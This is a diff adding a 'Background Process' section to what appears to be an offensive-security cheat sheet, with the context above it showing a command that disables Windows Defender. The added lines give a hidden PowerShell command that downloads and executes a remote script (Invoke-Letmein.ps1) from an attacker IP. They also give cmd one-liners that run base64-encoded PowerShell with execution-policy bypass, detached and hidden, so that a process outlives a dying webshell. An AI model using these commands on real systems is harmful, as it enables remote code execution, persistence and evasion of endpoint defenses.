@@ -76,3 +76,20 @@ Source: [https://liberiangeek.net/2023/11/how-to-disable-windows-defender-using-
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
+## Background Process
+
+Starts a new process, if webshell dies process won't
+```
+Start-Process powershell.exe -ArgumentList "-c IEX(IWR http://10.10.14.15/Invoke-Letmein.ps1 -UseBasicParsing)" -WindowStyle Hidden
+```
+
+Cmd version
+```bash
+# Run with cmd
+cmd /c powershell.exe -ep bypass -e JABj....pAA==
+# Run with cmd, background and aavoid hanging
+start /b powershell.exe -ep bypass -e JABj....pAA==
+# Run with cmd, fully detached
+cmd /c start /b powershell.exe -w hidden -ep bypass -e JABj....pAA==
+```
+
